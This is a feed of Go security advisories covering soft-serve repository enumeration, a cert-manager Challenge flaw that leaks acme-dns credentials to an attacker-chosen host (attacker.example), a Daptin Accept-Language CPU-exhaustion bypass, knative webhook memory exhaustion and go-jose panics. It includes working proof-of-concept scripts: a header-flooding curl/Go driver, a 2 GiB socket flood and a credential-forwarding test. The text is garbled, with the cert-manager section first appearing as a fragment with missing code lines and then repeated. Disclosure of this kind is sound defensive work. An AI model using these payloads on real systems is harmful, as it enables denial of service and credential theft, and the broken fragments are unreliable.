The same disclosure appears without ?go-get=1. The Git and LFS routes answered a repository the caller could not read differently depending on whether it existed: an anonymous clone of a private repository got 401 while a missing one got 404, and a signed-in user without access got the reverse pattern. Either way, one request confirms whether a guessed name is a private repository. This was found while fixing the go-get issue and is included here because it has the same impact and is fixed in the same release.

Impact

A remote client can learn, with one request per candidate name, which private repositories exist, their exact names, and their clone URLs. Under the shipped default of anon-access: read-only no account is needed, and an authenticated user without access to the repository gets the same answer. Project names in private deployments are often sensitive (internal codenames, unreleased products, customer names), and this turns them into an enumerable namespace.

The Git and LFS routes give the same confirmation for any guessed name, to anonymous and authenticated callers alike, and an invalid Authorization: Bearer header does the same even where credentials are otherwise required.

Repository contents, refs, commits, and collaborators are not exposed, and no write path is reachable. The LFS panic is caught by the recovery middleware and returns a 500; the server stays up. Hidden repositories are not affected beyond what direct access already allows, since hiding a repository removes it from listings but does not restrict reading it by name.

Reachable over the HTTP interface, which is enabled by default (AV:N), with one ordinary GET request per name (AC:L). No privileges are required under the default anonymous read access (PR:N), and no victim interaction is needed (UI:N). Only repository names and clone URLs are disclosed, which is a low confidentiality impact (C:L), with no integrity or availability impact (I:N, A:N), since the panic is recovered per request.

Root Cause

Two pieces of code each assumed the other had checked access.

withAccess in pkg/web/git.go computed the access level for the requested path and then let go-get requests through ahead of the guard meant to hide repositories:

case r.URL.Query().Get("go-get") == "1" && accessLevel >= access.ReadOnlyAccess:
    // Allow go-get requests to passthrough.
    break
case repo == nil, accessLevel < access.ReadOnlyAccess:
    // Don't hint that the repo exists if the user doesn't have access
    renderNotFound(w, r)
    return

For a path that is not itself a repository, AccessLevelForUser returns the anonymous access level to anonymous callers and read-write to any authenticated user, since that is what allows a push to create a new repository. The go-get case therefore always matched for a sub-path, and the "don't hint that the repo exists" guard below it never ran.

GoGetHandler in pkg/web/goget.go then trimmed path segments with path.Dir until be.Repository succeeded, and rendered the first repository it found. It never asked whether the caller could read that repository. The access level the middleware had computed was for a different path.

Because the exception lived in the middleware shared by every Git route rather than on the go-get route, it also applied to the dumb-HTTP and LFS routes. There it skipped the repo == nil guard, and serviceLfsBasicDownload and serviceLfsBasicUpload dereferenced a nil repository from the request context. The sibling LFS handlers already checked for nil, which is why only those two panicked.

The Git and LFS routes behind withAccess had the opposite problem: each branch chose its own response for a caller who could not read the repository, and the choice depended on which condition failed first. On the smart HTTP routes a missing repository was checked before credentials, so it returned 404, while a private one fell through to the credential prompt and returned 401. On the LFS write routes the write-access check ran before the read check, so a signed-in user got 403 for a private repository and 404 for a missing one. And parseJWT in pkg/web/auth.go rejected a token for a missing repository with a "missing repository" error, which the caller treated as anonymous, while a token for an existing repository failed as invalid and got 403.

Affected Versions

v0.5.0 through v0.12.2. The go-get walk-up without an access check was introduced in commit 3dfecd9 (fix(http): go-get requests), and private repositories arrived in the same v0.5.0 release. The middleware exception that also reached the LFS and dumb-HTTP routes was added in v0.6.0, together with the HTTP LFS routes, and the differing responses on the Git and LFS routes date from the same middleware.

Patches

Fixed in v0.12.3.

The go-get route no longer goes through the per-repository access middleware. It authenticates the caller and nothing more, and GoGetHandler checks read access on each repository it considers during the walk-up. A repository the caller cannot read is skipped exactly as if it did not exist, so an unreadable repository and a missing one produce the same 404, and a readable repository nested under an unreadable one still resolves.

The go-get exception is removed from withAccess entirely. Every Git, dumb-HTTP, and LFS route now enforces the repository existence and access checks regardless of the query string. The two LFS basic handlers also check for a missing repository, as their siblings did, so a future routing mistake returns a 404 rather than a panic.

AccessLevelForUser used to prefer the repository attached to the request over the name it was asked about. During the walk-up those differ, so the access check now always looks the repository up by the name it is given.

Bad credentials on a go-get request now return 403, the same as on the Git routes. Previously they were treated as anonymous for paths that were not themselves repositories.

On the Git and LFS routes, any repository the caller cannot read now gets one answer, decided in one place: 403 when the credentials are wrong, 401 with a credential prompt when the caller is anonymous, and 404 when they are signed in. This matches how GitHub responds. The LFS write checks now run after the read check, and a JWT presented for a missing repository is rejected as an invalid token like any other.

Two behaviours change as a result. An anonymous clone of a mistyped repository name now prompts for credentials instead of reporting that the repository does not exist, and a signed-in user without access to a private repository now gets "not found" instead of a credential prompt.

Pushing over HTTP to a name that does not exist still creates the repository, so a user allowed to create repositories can still tell a taken name from a free one by trying to push. That is inherent to push-to-create and is not changed here.

Workarounds

None. Upgrade to the patched release.

set -euo pipefail

cat > pkg/issuer/acme/dns/acmedns/direct_challenge_exfil_tmp_test.go <<'EOF'
package acmedns

import (
        "context"
        "net/http"
        "net/http/httptest"
        "testing"
)

        var gotUser, gotKey, gotPath string

                gotKey = r.Header.Get("X-Api-Key")

                        "password": "victim-pass",
                        "fulldomain": "x.example.org",
                        "subdomain": "x"
                }

                t.Fatal(err)
        }

        if err := provider.Present(context.Background(), "victim.example.com", "", "txt-value"); err != nil {
                t.Fatal(err)
        }

                t.Fatalf("path = %q, want /update", gotPath)
        }
        if gotUser != "victim-user" {
                t.Fatalf("X-Api-User = %q, want victim-user", gotUser)
        }
        if gotKey != "victim-pass" {
                t.Fatalf("X-Api-Key = %q, want victim-pass", gotKey)
        }
}

  -v "$PWD":/repo \
  -v /tmp/cert-manager-gomod-cache:/go/pkg/mod \
  -v /tmp/cert-manager-gobuild-cache:/root/.cache/go-build \
  -w /repo golang:1.26-bookworm \
  go test ./pkg/issuer/acme/dns/acmedns \
  -run TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost \
  -count=1 -v

=== RUN   TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost
--- PASS: TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost

Credential impact scope

The concrete credential-disclosure proof in this report is for the acme-dns provider: the attacker-controlled host receives the X-Api-User and X-Api-Key values loaded from the referenced account JSON.

For other DNS01 providers, this report should be read as credential use, policy bypass, and DNS mutation risk. The controller may use platform-owned secrets or ambient cloud credentials to perform DNS operations selected by the attacker-controlled Challenge. Provider-specific credential disclosure should not be assumed without a separate provider-level PoC.

Expected behavior

Users should not be able to create standalone Challenge resources that cause cert-manager to use arbitrary solver configuration under the authority of a referenced Issuer or ClusterIssuer. If direct Challenge resources are intentionally exposed, the controller should only reconcile Challenges that are owned by cert-manager-created Orders and whose solver config was selected from the referenced Issuer.

Actual behavior

A user with namespace-level Challenge create permission can create a direct Challenge with arbitrary solver configuration. The controller reconciles it, derives credential namespace and ambient credential permission from issuerRef, and uses attacker-controlled provider settings.

Suggested remediation

Possible mitigations:

  • Reject or ignore standalone user-created Challenge resources unless the controller or admission layer can confirm an existing cert-manager-created Order that owns the Challenge.
  • Do not rely only on the presence of an owner reference. Verify the referenced Order exists, is controlled by cert-manager's Order flow, and matches the Challenge by UID, owner reference, labels, DNS name, authorization URL, challenge URL, token/key material, and issuer reference.
  • Ensure the solver used by the Challenge was selected from the referenced Issuer/ClusterIssuer by the Order controller. The Challenge controller should not accept manually supplied solver provider configuration outside the Order-controller path.
  • Move Challenge and Order creation permissions out of aggregate edit unless direct use is a supported security boundary.
  • Add admission validation or CEL rules preventing direct user control over sensitive solver provider fields on standalone or unverifiable Challenges.

  • https://github.com/cert-manager/cert-manager/security/advisories/GHSA-8rvj-mm4h-c258
  • https://nvd.nist.gov/vuln/detail/CVE-2026-62290
  • https://github.com/cert-manager/cert-manager/pull/8940
  • https://github.com/cert-manager/cert-manager/pull/8941
  • https://github.com/cert-manager/cert-manager/commit/6bda47297c8fbc6b121b8b76624b668d26f1a155
  • https://github.com/cert-manager/cert-manager/commit/b37dbf01ecea50a0b3a19df0a7fe4c5ad6803f16
  • https://github.com/cert-manager/cert-manager/releases/tag/v1.19.6

ClusterIssuer victim.example.com https://attacker.example/acmedns cluster-acmedns-account

This proves that the API accepts the direct object from a user who cannot read the target secret or ClusterIssuer.

PoC B: acme-dns provider sends referenced credentials to the configured host

This self-contained unit PoC demonstrates the concrete acme-dns impact: the acme-dns provider uses the configured host and sends credentials from account JSON as HTTP headers.

Run from repository root:

set -euo pipefail

cat > pkg/issuer/acme/dns/acmedns/direct_challenge_exfil_tmp_test.go <<'EOF'
package acmedns

import (
        "context"
        "net/http"
        "net/http/httptest"
        "testing"
)

func TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost(t *testing.T) {
        var gotUser, gotKey, gotPath string

        ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
                gotPath = r.URL.Path
                gotUser = r.Header.Get("X-Api-User")
                gotKey = r.Header.Get("X-Api-Key")
                w.Header().Set("Content-Type", "application/json")
                w.WriteHeader(http.StatusOK)
                w.Write([]byte(`{"txt":"ok"}`))
        }))
        defer ts.Close()

        accountJSON := []byte(`{
                "victim.example.com": {
                        "username": "victim-user",
                        "password": "victim-pass",
                        "fulldomain": "x.example.org",
                        "subdomain": "x"
                }
        }`)

        provider, err := NewDNSProviderHostBytes(ts.URL, accountJSON, nil)
        if err != nil {
                t.Fatal(err)
        }

        if err := provider.Present(context.Background(), "victim.example.com", "", "txt-value"); err != nil {
                t.Fatal(err)
        }

        if gotPath != "/update" {
                t.Fatalf("path = %q, want /update", gotPath)
        }
        if gotUser != "victim-user" {
                t.Fatalf("X-Api-User = %q, want victim-user", gotUser)
        }
        if gotKey != "victim-pass" {
                t.Fatalf("X-Api-Key = %q, want victim-pass", gotKey)
        }
}
EOF

docker run --rm \
  -v "$PWD":/repo \
  -v /tmp/cert-manager-gomod-cache:/go/pkg/mod \
  -v /tmp/cert-manager-gobuild-cache:/root/.cache/go-build \
  -w /repo golang:1.26-bookworm \
  go test ./pkg/issuer/acme/dns/acmedns \
  -run TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost \
  -count=1 -v

Expected output:

=== RUN   TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost
--- PASS: TestTmpAcmeDNSPresentSendsAccountSecretToConfiguredHost

Combined with PoC A and the code path in pkg/issuer/acme/dns/dns.go, this shows that a direct Challenge can select an attacker-controlled acme-dns host while causing cert-manager to load account JSON from the ClusterIssuer resource namespace.

Credential impact scope

The concrete credential-disclosure proof in this report is for the acme-dns provider: the attacker-controlled host receives the X-Api-User and X-Api-Key values loaded from the referenced account JSON.

For other DNS01 providers, this report should be read as credential use, policy bypass, and DNS mutation risk. The controller may use platform-owned secrets or ambient cloud credentials to perform DNS operations selected by the attacker-controlled Challenge. Provider-specific credential disclosure should not be assumed without a separate provider-level PoC.

Expected behavior

Users should not be able to create standalone Challenge resources that cause cert-manager to use arbitrary solver configuration under the authority of a referenced Issuer or ClusterIssuer. If direct Challenge resources are intentionally exposed, the controller should only reconcile Challenges that are owned by cert-manager-created Orders and whose solver config was selected from the referenced Issuer.

Actual behavior

A user with namespace-level Challenge create permission can create a direct Challenge with arbitrary solver configuration. The controller reconciles it, derives credential namespace and ambient credential permission from issuerRef, and uses attacker-controlled provider settings.

Suggested remediation

Possible mitigations:

  • Reject or ignore standalone user-created Challenge resources unless the controller or admission layer can confirm an existing cert-manager-created Order that owns the Challenge.
  • Do not rely only on the presence of an owner reference. Verify the referenced Order exists, is controlled by cert-manager's Order flow, and matches the Challenge by UID, owner reference, labels, DNS name, authorization URL, challenge URL, token/key material, and issuer reference.
  • Ensure the solver used by the Challenge was selected from the referenced Issuer/ClusterIssuer by the Order controller. The Challenge controller should not accept manually supplied solver provider configuration outside the Order-controller path.
  • Move Challenge and Order creation permissions out of aggregate edit unless direct use is a supported security boundary.
  • Add admission validation or CEL rules preventing direct user control over sensitive solver provider fields on standalone or unverifiable Challenges.

entry.title: [github.com/daptin/daptin] Daptin: ParseAcceptLanguage `_` separator bypass enables >250x CPU amplification via Accept-Language header in LanguageMiddleware
entry.content:
Summary

Daptin's LanguageMiddleware (registered as a global gin middleware) calls golang.org/x/text/language.ParseAcceptLanguage on the raw Accept-Language header of every HTTP request without imposing any size or shape filter. The underlying parser has quadratic-time behaviour on long lists of malformed language tags. The CVE-2022-32149 guard that golang.org/x/text added in v0.3.8 caps the number of - characters in the input at 1000, but it does not cap _ characters even though the parser's internal scanner aliases _ to - before parsing. A single unauthenticated GET request with an Accept-Language header built out of _ separators (only 256 KiB, not even the 1 MiB ceiling) consumes about 27 seconds of server CPU on the host running Daptin. A 1 MiB payload exceeds the 2-minute test client timeout. A single attacker on a 1 Mbit/s uplink can pin an entire Daptin host with one request every 30 seconds.

Affected versions

github.com/daptin/daptin v0.12.15 and (per code inspection of master) all earlier 0.12.x versions that wire LanguageMiddleware on the global gin router without imposing their own size limit on Accept-Language. Verified on:

  • the official release binary daptin-linux-amd64 v0.12.15 built into a Docker image from the project's own Dockerfile (E2E below)
  • master at commit b021ac4ae1f72b7401e851fcf883bc970303c794 by reading server/language.go (the middleware is unchanged)

Privilege required

Unauthenticated. The middleware is registered on the global gin router that serves both the public landing page and the unauthenticated /api style endpoints. Anyone who can reach the HTTP listener (port 8080 by default) is in scope.

Vulnerable code

server/language.go (blob SHA b021ac4ae1f72b7401e851fcf883bc970303c794):

func (lm *LanguageMiddleware) LanguageMiddlewareFunc(c *gin.Context) {
    pref := GetLanguagePreference(c.GetHeader("Accept-Language"), lm.defaultLanguage)
    c.Request = c.Request.WithContext(context.WithValue(c.Request.Context(), "language_preference", pref))
}

func GetLanguagePreference(header string, defaultLanguage string) []string {
    preferredLanguage := header

    if preferredLanguage == "" || preferredLanguage == "undefined" || preferredLanguage == "null" {
        preferredLanguage = defaultLanguage
    }

    languageTags, _, err := language.ParseAcceptLanguage(preferredLanguage)
    resource.CheckErr(err, "Failed to parse Accept-Language header [%v]", preferredLanguage)
    pref := make([]string, 0)
    prefMap := make(map[string]bool)

    if len(languageTags) == 1 && languageTags[0].String() == defaultLanguage {
        // single tag matches default — skip
    } else {
        for _, tag := range languageTags {
            base, conf := tag.Base()
            if conf == 0 {
                continue
            }
            if prefMap[base.String()] == true {
                continue
            }
            prefMap[base.String()] = true
            pref = append(pref, base.String())
        }
    }
    return pref
}

c.GetHeader("Accept-Language") is the unfiltered HTTP header. Go's default net/http MaxHeaderBytes is 1 << 20 = 1 MiB and Daptin does not override it, so the parser is allowed to receive up to a megabyte of attacker-controlled data.

The resource.CheckErr call on the error path also formats the entire input string into a log line (Failed to parse Accept-Language header [%v]), amplifying the cost on attacker-supplied 256 KiB-1 MiB payloads.

CVE-2022-32149 hardened ParseAcceptLanguage by counting - characters and rejecting inputs with more than 1000 of them. The guard does not count _ characters even though the scanner converts _ to - at parse time (golang.org/x/text/internal/language/parse.go). A 256 KiB header full of 9-character _abcdefghi tokens contains zero - characters, passes the guard, and then drives the scanner into the O(N²) gobble path.

How Accept-Language reaches ParseAcceptLanguage

Every HTTP request that hits the Daptin API server passes through LanguageMiddleware (registered as a global gin middleware). The middleware sequence is:

  1. The request enters LanguageMiddlewareFunc.
  2. c.GetHeader("Accept-Language") returns the full attacker-supplied header value.
  3. GetLanguagePreference(header, defaultLanguage) is called.
  4. The function passes the unfiltered header into language.ParseAcceptLanguage(preferredLanguage).

No size or character-class filter is applied between (2) and (4). The middleware runs for every gin handler — including the unauthenticated landing page at / and the public API root at /api.

Proof of concept

Single-line bash reproducer that crafts the malicious header and times one request against a fresh Daptin container built from the project's own Dockerfile:

# Build daptin image (uses prebuilt linux/amd64 release binary)
cd daptin
curl -fL -O https://github.com/daptin/daptin/releases/download/v0.12.15/daptin-linux-amd64
chmod +x daptin-linux-amd64
docker build --platform linux/amd64 -t daptin-poc:v0.12.15 .

# Start it
docker run -d --platform linux/amd64 --name daptin --rm -p 18888:8080 daptin-poc:v0.12.15
sleep 8  # wait for sqlite migrations + Olric ring

# Attack with a 256 KiB header (smaller than the default 1 MiB ceiling
# because daptin's per-request cost saturates well below 1 MiB)
PAYLOAD="en$(python3 -c 'print("_abcdefghi" * 25600, end="")')"
echo "header size = ${#PAYLOAD} bytes"

curl -sS -o /dev/null \
  -w 'http=%{http_code} t=%{time_total}\n' \
  -H "Accept-Language: ${PAYLOAD}" \
  http://127.0.0.1:18888/

Each 9-character _abcdefghi token has length 9, which fails the scanner's len <= 8 tag-length check at golang.org/x/text/internal/language/parse.go and triggers a gobble call that runtime.memmoves the entire remaining buffer. With N invalid tokens the total bytes moved by gobble is O(N²).

End-to-end reproduction (against daptin-linux-amd64 v0.12.15)

A Go driver poc.go boots the container, sends a 256 KiB Accept-Language value once with - (CVE-2022-32149 guard fires) and once with _ (guard bypassed):

// poc.go
package main

import (
    "fmt"
    "io"
    "net"
    "net/http"
    "strings"
    "time"
)

const targetURL = "http://127.0.0.1:18888/"

func buildPayload(sep string, targetBytes int) string {
    const tok = "abcdefghi"
    var b strings.Builder
    b.Grow(targetBytes + 16)
    b.WriteString("en")
    for b.Len()+1+len(tok) <= targetBytes {
        b.WriteString(sep)
        b.WriteString(tok)
    }
    return b.String()
}

func send(label, header string) {
    client := &http.Client{
        Timeout: 120 * time.Second,
        Transport: &http.Transport{
            DisableKeepAlives: true,
            DialContext: (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
        },
    }
    req, _ := http.NewRequest("GET", targetURL, nil)
    if header != "" {
        req.Header.Set("Accept-Language", header)
    }
    t0 := time.Now()
    resp, err := client.Do(req)
    dt := time.Since(t0)
    if err != nil {
        fmt.Printf("  %-32s ERR after %v: %v\n", label, dt, err)
        return
    }
    _, _ = io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    fmt.Printf("  %-32s header=%d B  '_'=%d  '-'=%d  status=%d  t=%v\n",
        label, len(header),
        strings.Count(header, "_"), strings.Count(header, "-"),
        resp.StatusCode, dt)
}

func main() {
    send("warm-up", "")
    send("baseline (no header)", "")
    send("baseline (1 short tag)", "en-US")
    send("guard-fires ('-' x 256KiB)", buildPayload("-", 256*1024))
    send("attack ('_' x 256KiB)",     buildPayload("_", 256*1024))
    send("attack repeat 2",            buildPayload("_", 256*1024))
    send("attack repeat 3",            buildPayload("_", 256*1024))
}

Captured run output (Apple M1 Pro, darwin/arm64 host, daptin amd64 binary v0.12.15 running under Docker Desktop with QEMU x86_64 emulation):

E2E: golang/x/text ParseAcceptLanguage '_' bypass through
daptin/daptin v0.12.15 LanguageMiddleware at
server/language.go.

Target: http://127.0.0.1:18888/   payload=262144 B

  warm-up                                      header=0 B  '_'=0  '-'=0  status=200  t=19.968ms

--- measurements (single request each) ---
  baseline (no header)                         header=0 B  '_'=0  '-'=0  status=200  t=25.924208ms
  baseline (1 short tag)                       header=5 B  '_'=0  '-'=1  status=200  t=28.398333ms
  guard-fires control ('-' x 256KiB)           header=262142 B  '_'=0  '-'=26214  status=200  t=105.506458ms
  attack ('_' x 256KiB)                        header=262142 B  '_'=26214  '-'=0  status=200  t=26.679448875s
  attack repeat 2                              header=262142 B  '_'=26214  '-'=0  status=200  t=18.012964208s
  attack repeat 3                              header=262142 B  '_'=26214  '-'=0  status=200  t=8.868606042s

A separate run with a 1 MiB payload exceeded the 2-minute client timeout on the attack request, confirming that the cost scales beyond 120 s per request at 1 MiB.

Interpretation:

Request Header bytes Server time
no header / short tag 0 - 5 26 - 28 ms
256 KiB - separators (CVE-2022-32149 guard fires) 256 KiB 106 ms
256 KiB _ separators (guard bypassed) 256 KiB 9 - 27 s
1 MiB _ separators (guard bypassed) 1 MiB > 120 s

The - control proves that the existing CVE-2022-32149 guard does still work on the canonical separator: a 256 KiB - payload returns in 106 ms because the parser short-circuits with ErrTagListTooLarge. The _ attack returns 200 from the same endpoint but consumes 9-27 s of server CPU because the guard did not fire and the quadratic scanner ran to completion. The amplification factor at the application boundary is ~85-250x on the 256 KiB payload and >1000x on a 1 MiB payload.

The amplification is higher than other consumers of ParseAcceptLanguage because Daptin formats the entire input into a log line via resource.CheckErr(err, "Failed to parse Accept-Language header [%v]", preferredLanguage) when parsing fails, and runs additional bookkeeping in GetLanguagePreference (a prefMap deduplication loop over the resulting tag slice).

Impact

  • One unauthenticated client can pin one CPU core for ~9-27 seconds per 256 KiB request, or for at least 120 seconds per 1 MiB request.
  • A single attacker on a 1 Mbit/s uplink can sustain ~1 attack request every 30 seconds, pinning one server core continuously with one TCP connection.
  • A small number of concurrent attackers using ~10 MiB/s of upstream bandwidth pin a 10-core Daptin instance indefinitely.
  • The endpoint returns 200 OK, so the attack does not surface as abnormal traffic in standard 4xx/5xx dashboards.

Suggested fix

Apply the size / character-class filter inside LanguageMiddleware (and inside GetLanguagePreference for defence in depth) before reaching language.ParseAcceptLanguage. The smallest change that preserves the existing behaviour for legitimate Accept-Language headers is to count _ alongside - and short-circuit when the total exceeds a small ceiling:

// server/language.go
const maxAcceptLanguageSeparators = 32 // real browsers send < 10

func (lm *LanguageMiddleware) LanguageMiddlewareFunc(c *gin.Context) {
    header := c.GetHeader("Accept-Language")
    if strings.Count(header, "-")+strings.Count(header, "_") > maxAcceptLanguageSeparators {
        // Refuse to call into the BCP 47 parser with absurd input.
        header = ""
    }
    pref := GetLanguagePreference(header, lm.defaultLanguage)
    c.Request = c.Request.WithContext(context.WithValue(c.Request.Context(), "language_preference", pref))
}

A real Accept-Language header from a browser contains under 10 separators, so a ceiling of 32 leaves plenty of headroom while making the quadratic blow-up impossible.

The underlying issue is in golang.org/x/text/language. A future upstream fix is the right long-term solution; the change above is defensive-in-depth at the middleware that consumes attacker input.

Credit

Reported by tonghuaroot.

Fix PR

https://github.com/daptin/daptin-ghsa-rhj7-vh3v-mcq6/pull/1

Maintainer fix status

Fixed on master in commit 2d709509 Harden Accept-Language parsing.

The fix caps combined - and _ separators in Accept-Language before calling language.ParseAcceptLanguage, both in LanguageMiddlewareFunc and in GetLanguagePreference for defence in depth. Regression coverage was added in server/language_test.go for normal browser headers, a 256 KiB underscore-separated malformed header, and combined separator counting.

Verification run:

go test ./server -count=1

Result: passed.

References

  • https://github.com/daptin/daptin/security/advisories/GHSA-rhj7-vh3v-mcq6
  • https://github.com/advisories/GHSA-rhj7-vh3v-mcq6

entry.title: [knative.dev/pkg] knative.dev/pkg admission webhooks allow unbounded request-body memory exhaustion
entry.content:
⚠️ Update (verification, 2026-05-19): C-2 confirmed end-to-end — 4.5× amplification observed (worse than the advisory's conservative 2× claim)

Built a Go PoC (cmd/poc-c2/main.go) that runs the exact 8-line vulnerable snippet from webhook/admission.go:109-117 verbatim under the same http.HandlerFunc shape (the full production admissionHandler at :85 requires *Webhook + AdmissionController + an informer-synced channel + controller-runtime / client-go scaffolding — the bug is the missing http.MaxBytesReader, nothing else in the handler). Bound to 127.0.0.1:18098.

PoC client streamed 2 GiB of a bytes over a raw TCP socket. runtime.MemStats.HeapAlloc sampler:

baseline:  HeapAlloc =     0.32 MiB
peak:      HeapAlloc = 9 217.38 MiB  =  9.00 GiB
ratio:     4.50× the body size

The advisory predicted ~2× from io.TeeReader doubling the body once in bodyBuffer. The observed 4.5× ratio comes from the interaction of two amplifiers: bytes.Buffer.ReadFrom (used by TeeReader-fed bodyBuffer) doubles its backing slice on every grow, so peak occupancy during a realloc is old + new = 3× the live data — and json.Decoder holds its own working buffer in parallel. The advisory's 2× floor is comfortably exceeded.

Downstream impact reminder: this library backs every Knative serving / eventing controller, every Tekton Triggers / Pipelines webhook, KEDA, Sigstore policy-controller, Kpack, and many more. A 2 GiB body to any of those projects' admission webhook ports OOMs the controller at 4.5× the body — i.e., even a 128 MiB request OOMs a 512 MiB-limited Pod.

Summary

knative.dev/pkg's admission webhook handler reads the incoming HTTP request body via json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)) with no http.MaxBytesReader wrapping the body. Because every consumer of knative.dev/pkg/webhook inherits this handler (Knative serving / eventing, Tekton Pipelines, KEDA, Sigstore policy-controller, and others), a single oversized POST to any of those projects' admission webhook ports drives the controller pod into memory exhaustion and OOM-kill. Worse, the io.TeeReader design keeps a verbatim copy of the body in bodyBuffer while the decoder also materializes the parsed struct — so the peak memory usage is roughly twice the body size.

This is the same shape as CVE-2026-24514 (ingress-nginx) and GHSA-9539-c3xr-w9vm (Kyverno admission body OOM) filed today against the same antipattern.

Affected versions

  • knative.dev/pkg — main HEAD on github.com/knative/pkg (verified 2026-05-18 against webhook/admission.go sha 1ad5a1ce0ee7043081cb50fd1acc6d36a9126844).
  • Every release that ships the current webhook/admission.go handler.

Vulnerable code

webhook/admission.go:109-117:

review := admissionv1.AdmissionReview{}
var bodyBuffer bytes.Buffer
if err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {
    http.Error(w, fmt.Sprintf("could not decode body: %v", err), http.StatusBadRequest)
    return
}

There is no http.MaxBytesReader around r.Body. The standard library's json.NewDecoder will read until EOF or the matching closing }. The io.TeeReader simultaneously copies every byte read from r.Body into bodyBuffer, which the rest of the handler uses for the response trailer / observability.

Downstream impact (the reason this matters)

knative.dev/pkg/webhook is the default admission-webhook scaffolding for the entire Knative + CNCF webhook ecosystem:

Consumer Repo Webhook surface
Knative serving knative/serving resource validation / defaulting
Knative eventing knative/eventing resource validation / defaulting
Tekton Pipelines tektoncd/pipeline Pipeline / Task / TaskRun validation
Tekton Triggers tektoncd/triggers EventListener / Trigger validation
KEDA kedacore/keda ScaledObject / ScaledJob validation
Sigstore policy-controller sigstore/policy-controller ClusterImagePolicy mutating + validating
Kpack buildpacks-community/kpack Image / Builder validation
...

Every one of these consumers ships the same io.ReadAll-equivalent body read with no upper bound. A pod-network-reachable attacker can OOM-kill any of them with a single large POST. failurePolicy=Fail admission webhooks (the secure-default) then take the namespace's or cluster's admission flow offline until the controller restarts.

Impact

  • Class: CWE-770 unbounded allocation. Reachable from any pod-network client.
  • Severity per consumer: depends on how each consumer configures failurePolicy. For projects with failurePolicy=Fail (e.g., Sigstore policy-controller's image-policy enforcement), the consequence is cluster-wide admission outage. For failurePolicy=Ignore, the consequence is "this project's webhook is offline" but the API server continues admitting requests.
  • Severity: matches the broader CVE-2026-24514 / GHSA-9539-c3xr-w9vm. Single-packet DoS on the library; each downstream consumer inherits the bug.

Reproduction

The exact same PoC built against Kyverno's admission handler reproduces this:

import socket
total = 2 << 30   # 2 GiB
s = socket.create_connection(('<knative-or-tekton-webhook-host>', 8443))
s.sendall(b'POST /<admission-path> HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % total)
chunk = b'a' * (1 << 20)
for _ in range(total >> 20): s.sendall(chunk)

Observed against the Kyverno admission handler (same antipattern):

baseline:        HeapAlloc=7 MiB     Sys=22 MiB
after read:      HeapAlloc=9500 MiB  Sys=9548 MiB  (4 GiB body → 9.5 GiB peak; io.TeeReader doubles)

For the knative/pkg version, the io.TeeReader doubles the resident memory (one copy in the decoder's accumulating slice, one in bodyBuffer). A kyverno-admission-controller-equivalent Pod with a 256 MiB memory limit OOM-kills with ~128 MiB of body.

Suggested fix

Wrap the request body with http.MaxBytesReader (and add a http.StatusRequestEntityTooLarge branch on the MaxBytesError path):

const maxAdmissionRequestSize = 8 << 20 // 8 MiB — controller-runtime's default; large enough for Kubernetes' own admission objects
r.Body = http.MaxBytesReader(w, r.Body, maxAdmissionRequestSize)
var bodyBuffer bytes.Buffer
review := admissionv1.AdmissionReview{}
if err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {
    var mbe *http.MaxBytesError
    if errors.As(err, &mbe) {
        http.Error(w, "admission body exceeds maximum size", http.StatusRequestEntityTooLarge)
        return
    }
    http.Error(w, fmt.Sprintf("could not decode body: %v", err), http.StatusBadRequest)
    return
}

This propagates a fix to every downstream consumer with no API change, and the cap can be made configurable per-server via a new field on the webhook.Options struct.

Disclosure

Reporting privately under your security policy. No public disclosure on my side until you have a fix or coordinated timeline. Encourage maintainers to coordinate with downstream consumers (Knative, Tekton, KEDA, Sigstore) on simultaneous release.

Reporter

tonghuaroot (tonghuaroot@gmail.com)

References

  • https://github.com/knative/pkg/security/advisories/GHSA-2hw4-c9m4-f2fj
  • https://github.com/knative/pkg/pull/3363
  • https://github.com/knative/pkg/commit/52dbd5ece63fe6d2d340ecbebec160550f460818
  • https://github.com/advisories/GHSA-2hw4-c9m4-f2fj

entry.title: [github.com/go-jose/go-jose/v3] Go JOSE: Panics in JSON parsing
entry.content:
Summary

Parsing deeply nested JSON structures can hit Go's stack limit, causing the application to crash.

Note: this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.

Impact

Denial of service vulnerability. Any application that parses untrusted JSON via go-jose is exposed.

Workarounds

Reject large inputs before parsing them.

Acknowledgements

Thanks to Dohyun Kim (@azza999), Joshua Rogers of AISLE Research, and Sueun Cho for alerting us to the need to patch this.

References

  • https://github.com/go-jose/go-jose/security/advisories/GHSA-vvm8-gf78-28g4
  • https://nvd.nist.gov/vuln/detail/CVE-2026-116586
  • https://github.com/go-jose/go-jose/pull/290
  • https://github.com/go-jose/go-jose/commit/a31af25836222f4c45d366d6e8f9b1049dd9935a

entry.title: [github.com/go-jose/go-jose/v4] Go JOSE: Panics in JSON parsing
entry.content:
Summary

Parsing deeply nested JSON structures can hit Go's stack limit, causing the application to crash.

Note: this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.

Impact

Denial of service vulnerability. Any application that parses untrusted JSON via go-jose is exposed.

Workarounds

Reject large inputs before parsing them.

entry.title: [github.com/go-jose/go-jose/v3] Go JOSE: Panic during CBC-HMAC processing
entry.content:
Summary

Decrypting a ciphertext with "A128CBC-HS256", "A192CBC-HS384", or "A256CBC-HS512" can result in a panic on untrusted input.

Note this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.

Details

Insufficient validation of parameters can lead to attempting to index into an empty buffer. See https://github.com/go-jose/go-jose/pull/292.

Workarounds

